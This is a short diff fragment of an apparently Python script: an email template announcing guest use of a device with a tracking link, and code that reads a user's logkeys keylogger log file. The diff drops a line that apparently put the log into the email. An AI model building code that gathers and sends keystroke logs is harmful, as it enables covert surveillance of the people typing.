@@ -15,9 +15,7 @@ Subject: Guest Access
 Your device is currently been used by a Guest User.
 
 Use this link to locate it:
-https://locationmagic.org/locate and insert the Token <TOKEN>
-
-Log: """
+https://locationmagic.org/locate and insert the Token <TOKEN>\n\n"""
 
 user = sys.argv[1]
 with open('/tmp/' + user + '/.config/logkeys/user.log', 'r') as f:
